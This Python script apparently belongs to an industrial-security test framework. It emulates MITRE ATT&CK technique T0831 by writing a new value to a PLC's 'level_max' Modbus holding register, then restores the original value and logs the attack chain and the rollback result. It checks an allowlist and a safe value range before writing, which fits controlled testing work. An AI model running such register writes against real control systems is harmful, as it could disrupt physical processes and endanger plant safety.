#!/usr/bin/env python3
from __future__ import annotations

import sys
from pathlib import Path

from app_core.infrastructure.attack.industrial_ops import (
    artifact_ref,
    attacker_context_from_argv,
    build_causal_edges,
    build_recoverability_report,
    build_uncertainty_report,
    clone_runtime_artifacts,
    collect_state,
    emit_json_banner,
    ensure_validated_context,
    mbpoll_write,
    output_dir_from_argv,
    policy_write_target,
    validated_address,
    load_params,
    utc_now,
    write_json,
)
from app_core.infrastructure.attack.industrial_resolver import derive_scenario_id


ATTACK_ID = "T0831_MANIPULATION_OF_CONTROL_MODBUS"
MITRE_ID = "T0831"
VARIABLES = [
    "level",
    "level_max",
    "openOutletValve",
    "outletValveOpenStatus",
    "openInletValve",
    "inletValveOpenStatus",
    "airValveOpenStatus",
]


def _observed_services(context: dict) -> dict:
    plc = context["runtime_assets"]["plc"]
    scada = context["runtime_assets"]["scada"]
    return {
        "plc": {"ip": plc.get("ip"), "port": 502, "reachable": plc.get("tcp_502_open", False)},
        "scada": {"ip": scada.get("ip"), "reachable": scada.get("service_reachable", False)},
    }


def main(argv: list[str]) -> int:
    params = load_params(argv)
    output_dir = output_dir_from_argv(argv)
    attacker = attacker_context_from_argv(argv)
    context = ensure_validated_context(output_dir, require_validation=True)
    clone_runtime_artifacts(output_dir)
    scenario_id = derive_scenario_id()
    target_ip = context["register_map"]["plc"].get("ip") or argv[1] or "unknown"
    write_target = policy_write_target(context, "level_max")
    validated = validated_address(context, "level_max")

    print("===========================================")
    print("ATT&CK PROFILE: T0831 - Manipulation of Control")
    print(f"TARGET: {target_ip}")
    print("MODE: CONTROLLED CAUSAL CHAIN WITH ROLLBACK")
    print("===========================================")

    if not write_target or not validated:
        print("[FAIL] No validated allowlist target for level_max")
        return 2

    requested_value = int(params.get("value", write_target.get("default_attack_value", 30)))
    safe_min = int(write_target.get("safe_min", 10))
    safe_max = int(write_target.get("safe_max", 90))
    if requested_value < safe_min or requested_value > safe_max:
        print("[FAIL] Requested value outside safe range")
        return 2

    slave_id = 1
    if context.get("scada_map", {}).get("modbus_devices"):
        slave_id = int(context["scada_map"]["modbus_devices"][0].get("slaveid") or 1)
    modbus_address = int(validated["validated_modbus_address"])

    discovery_scan = {
        "attack_id": ATTACK_ID,
        "mitre_id": "T0846",
        "scenario_id": scenario_id,
        "run_id": Path(output_dir).name,
        "generated_at_utc": utc_now(),
        "target_ip": target_ip,
        "source_ip": attacker["source_ip"],
        "observed_services": _observed_services(context),
    }
    observed_services = discovery_scan["observed_services"]
    pre_state = collect_state(context, VARIABLES, source_ip=attacker["source_ip"], source_user=attacker["source_user"])
    original = pre_state["variables"].get("level_max", {}).get("value")
    if original is None:
        print("[FAIL] Could not read pre-state level_max")
        return 2

    write_result = mbpoll_write(
        target_ip,
        slave_id,
        write_target.get("modbus_table", "holding_register"),
        modbus_address,
        requested_value,
        source_ip=attacker["source_ip"],
        source_user=attacker["source_user"],
    )
    if not write_result.get("ok"):
        print("[FAIL] Control manipulation write failed")
        return 2

    post_state = collect_state(context, VARIABLES, source_ip=attacker["source_ip"], source_user=attacker["source_user"])
    rollback = mbpoll_write(
        target_ip,
        slave_id,
        write_target.get("modbus_table", "holding_register"),
        modbus_address,
        int(original),
        source_ip=attacker["source_ip"],
        source_user=attacker["source_user"],
    )
    restored_state = collect_state(context, VARIABLES, source_ip=attacker["source_ip"], source_user=attacker["source_user"])
    rollback_ok = rollback.get("ok", False)
    restored_ok = restored_state["variables"].get("level_max", {}).get("value") == original

    scenario_chain = {
        "attack_id": ATTACK_ID,
        "mitre_id": MITRE_ID,
        "scenario_id": scenario_id,
        "run_id": Path(output_dir).name,
        "target_ip": target_ip,
        "target_role": "industrial_plc",
        "source_ip": attacker["source_ip"],
        "generated_at_utc": utc_now(),
        "chain_steps": [
            {"technique": "T0846.001", "name": "Remote System Discovery", "status": "completed"},
            {"technique": "T0861", "name": "Point and Tag Identification", "status": "completed"},
            {"technique": "T0877", "name": "I/O Image Before", "status": "completed"},
            {"technique": "T1692.001/T0836", "name": "Controlled Unauthorized/Parameter Write", "status": "completed" if write_result.get("ok") else "failed"},
            {"technique": "T0877", "name": "I/O Image After", "status": "completed"},
            {"technique": "rollback", "name": "State Restoration", "status": "completed" if rollback_ok and restored_ok else "failed"},
        ],
    }
    causal_graph = build_causal_edges(
        attack_id=ATTACK_ID,
        mitre_id=MITRE_ID,
        scenario_id=scenario_id,
        source_ip=attacker["source_ip"],
        target_ip=target_ip,
        target_role="industrial_plc",
        write_target="level_max",
    )
    recoverability = build_recoverability_report(
        attack_id=ATTACK_ID,
        scenario_id=scenario_id,
        rollback_ok=rollback_ok,
        restored_ok=restored_ok,
    )
    uncertainty = build_uncertainty_report(
        attack_id=ATTACK_ID,
        mitre_id=MITRE_ID,
        scenario_id=scenario_id,
        notes=[
            {"canonical_name": "level_max_before", "status": "confirmed", "reason": "pre_state_read"},
            {"canonical_name": "level_max_after", "status": "confirmed" if post_state["variables"].get("level_max", {}).get("value") == requested_value else "unresolved", "reason": "post_state_read"},
            {"canonical_name": "restored_state", "status": "confirmed" if restored_ok else "unresolved", "reason": "rollback_verification"},
        ],
    )

    files = {
        "discovery_scan.json": discovery_scan,
        "observed_services.json": observed_services,
        "plc_state_before.json": pre_state,
        "plc_state_after.json": post_state,
        "plc_state_restored.json": restored_state,
        "scenario_attack_chain.json": scenario_chain,
        "modbus_transaction_log.json": {"write_command": write_result, "rollback_command": rollback},
        "rollback_log.json": {"rollback_ok": rollback_ok, "restored_state_verified": restored_ok},
        "causal_edges.json": causal_graph,
        "causal_graph.json": causal_graph,
        "causal_path_recoverability.json": recoverability,
        "uncertainty_report.json": uncertainty,
    }
    for name, payload in files.items():
        write_json(output_dir / name, payload)

    summary = {
        "attack_id": ATTACK_ID,
        "target_ip": target_ip,
        "rollback_ok": rollback_ok,
        "restored_ok": restored_ok,
        "artifacts": [artifact_ref(output_dir / name, output_dir) for name in files],
    }
    emit_json_banner(summary)
    return 0 if rollback_ok and restored_ok else 3


if __name__ == "__main__":
    sys.exit(main(sys.argv))
